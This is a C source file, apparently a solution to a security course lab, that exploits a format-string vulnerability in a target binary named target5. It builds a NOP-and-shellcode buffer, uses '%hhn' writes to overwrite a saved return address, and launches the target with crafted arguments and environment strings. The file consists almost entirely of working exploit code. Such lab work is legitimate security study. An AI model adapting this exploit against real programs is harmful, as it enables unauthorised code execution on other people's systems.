#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target5"
#define BUFFER_SIZE 229
#define NOP 0x90

/*
 * rip:          0x40a4fe68
 * formatString: 0x40a4f960
 *
 * 0x40(64)  ->  0x40a4fe68
 * 0xa4(164) ->  0x40a4fe69
 * 0xf9(249) ->  0x40a4fe6a
 * 0x60(352) ->  0x40a4fe6b
 */

int main(void)
{
        char *args[3];

        char buf[BUFFER_SIZE];

        int i;
        for (i = 0; i < 229; i++)
        {
                buf[i] = NOP;
        }

        for (i = 0; i < strlen(shellcode); i++)
        {
                buf[i] = shellcode[i];
        }

        char str [] = "%64x%37$hhn%100x%36$hhn%85x%35$hhn%103x%34$hhn";

        memcpy(&buf[60], str, strlen(str));

        memcpy(&buf[256 - 32], "\x68\xfe\xa4\x40\x00", 5);

        args[0] = TARGET;
        args[1] = buf;
        args[2] = NULL;

        char *env[] = {
            "\x00",
            "\x00",
            "\x00",
            "\x69\xfe\xa4\x40",
            "\x00",
            "\x00",
            "\x00",
            "\x6a\xfe\xa4\x40",
            "\x00",
            "\x00",
            "\x00",
            "\x6b\xfe\xa4\x40",
            "\x00",
            "\x00",
            "\x00",
            NULL
          };


        if (0 > execve(TARGET, args, env))
                fprintf(stderr, "execve failed.\n");

        return 0;
}
